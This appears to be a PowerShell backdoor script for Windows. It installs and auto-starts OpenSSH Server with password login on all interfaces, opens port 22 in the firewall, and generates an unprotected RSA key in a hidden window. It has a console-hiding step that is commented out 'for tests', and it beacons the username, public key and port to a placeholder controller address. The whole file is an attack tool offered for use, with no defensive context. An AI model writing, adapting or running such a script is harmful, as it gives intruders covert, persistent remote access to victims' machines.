$hwnd = Get-Process -Id $PID | ForEach-Object { $_.MainWindowHandle }
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
# [WinAPI]::ShowWindow($hwnd, 0) # hide terminal commented to tests

$opensshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
if ($opensshServer.State -ne 'Installed') {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
}

Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

$sshdConfigPath = "C:\ProgramData\ssh\sshd_config"
if (-not (Test-Path $sshdConfigPath)) {
    @"
# Default SSH Configuration
Port 22
AddressFamily any
ListenAddress 0.0.0.0
ListenAddress ::
HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key
HostKey __PROGRAMDATA__/ssh/ssh_host_rsa_key
AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
Subsystem sftp sftp-server.exe
PasswordAuthentication yes
"@ | Set-Content $sshdConfigPath
}

Restart-Service sshd

$firewallRule = Get-NetFirewallRule -DisplayName "Allow SSH"
if (-not $firewallRule) {
    New-NetFirewallRule -Name "AllowSSH" -DisplayName "Allow SSH" -Protocol TCP -LocalPort 22 -Action Allow -Direction Inbound
}

$sshDir = "$HOME\.ssh"
if (-not (Test-Path -Path $sshDir)) {
    New-Item -ItemType Directory -Force -Path $sshDir
}

$sshKey = "$sshDir\id_rsa"
$sshKeyPub = "$sshKey.pub"

if (-not (Test-Path -Path $sshKey)) {
    Start-Process "ssh-keygen" -ArgumentList "-t rsa -b 2048 -f $sshKey -q -N ''" -WindowStyle Hidden -Wait
}

if (Test-Path -Path $sshKeyPub) {
    $publicKey = Get-Content -Path $sshKeyPub -Raw
} else {
    $publicKey = "[Error: Public key not generated]"
}

$username = $env:USERNAME
$port = 22

# Enviar los datos vía POST
$postUri = "http://IP:PORT/host"
$postData = @{
    "Username" = $username
    "PublicKey" = $publicKey
    "Port" = $port
} | ConvertTo-Json

Invoke-RestMethod -Uri $postUri -Method Post -Body $postData -ContentType 'application/json'
